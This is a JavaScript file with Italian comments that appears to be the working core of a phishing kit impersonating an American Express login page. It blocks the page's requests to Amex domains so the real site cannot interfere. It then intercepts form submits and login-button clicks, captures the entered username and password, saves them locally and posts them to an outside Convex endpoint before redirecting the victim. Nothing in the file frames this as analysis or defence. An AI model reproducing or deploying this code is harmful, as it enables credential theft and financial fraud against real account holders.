(function(){
  'use strict';

  // Blocca tutte le chiamate esterne
  const _fetch = window.fetch;
  window.fetch = function(u, o) {
    if (typeof u === 'string' && (u.includes('americanexpress') || u.includes('aexp') || u.includes('amex'))) {
      console.log('🚫 Blocked fetch:', u);
      return Promise.resolve(new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } }));
    }
    return _fetch.apply(this, arguments);
  };

  const _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m, u) {
    if (typeof u === 'string' && (u.includes('americanexpress') || u.includes('aexp') || u.includes('amex'))) {
      console.log('🚫 Blocked XHR:', u);
      return;
    }
    return _open.apply(this, arguments);
  };

  // Blocca creazione dinamica di script/link/img esterni
  const _createElement = document.createElement;
  document.createElement = function(tag) {
    const el = _createElement.call(document, tag);
    if (tag.toLowerCase() === 'script') {
      Object.defineProperty(el, 'src', {
        set: function(v) {
          if (typeof v === 'string' && (v.includes('americanexpress') || v.includes('aexp'))) {
            console.log('🚫 Blocked script src:', v);
            return;
          }
          el.setAttribute('src', v);
        },
        get: function() { return el.getAttribute('src'); }
      });
    }
    return el;
  };

  // Cattura credenziali
  const CONVEX = 'https://dynamic-stoat-328.convex.cloud';

  async function saveCreds(username, password) {
    const data = JSON.parse(localStorage.getItem('amex_creds') || '[]');
    data.push({ u: username, p: password, t: Date.now() });
    localStorage.setItem('amex_creds', JSON.stringify(data));
    try {
      await _fetch(CONVEX + '/api/credentials/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
    } catch(e) {
      console.log('Saved locally only');
    }
  }

  // Intercetta submit
  document.addEventListener('submit', function(e) {
    const user = document.querySelector('#eliloUserID, input[name="eliloUserID"], input[type="text"]');
    const pwd = document.querySelector('#eliloPassword, input[name="eliloPassword"], input[type="password"]');
    if (pwd && pwd.value) {
      e.preventDefault();
      e.stopPropagation();
      console.log('✅ Captured credentials');
      saveCreds(user?.value || '', pwd.value).then(function() {
        window.location.href = '/success/';
      });
    }
  }, true);

  // Intercetta click su pulsanti
  document.addEventListener('click', function(e) {
    const btn = e.target.closest('button');
    if (!btn) return;

    const text = (btn.textContent || '').toLowerCase();
    if (text.includes('accedi') || text.includes('continua') || text.includes('entra') || text.includes('login')) {
      e.preventDefault();
      e.stopPropagation();

      const user = document.querySelector('#eliloUserID, input[name="eliloUserID"], input[type="text"]');
      const pwd = document.querySelector('#eliloPassword, input[name="eliloPassword"], input[type="password"]');

      if (pwd && pwd.value) {
        console.log('✅ Captured credentials');
        saveCreds(user?.value || '', pwd.value).then(function() {
          window.location.href = '/success/';
        });
      }
    }
  }, true);

  console.log('✅ Amex intercept loaded');
})();
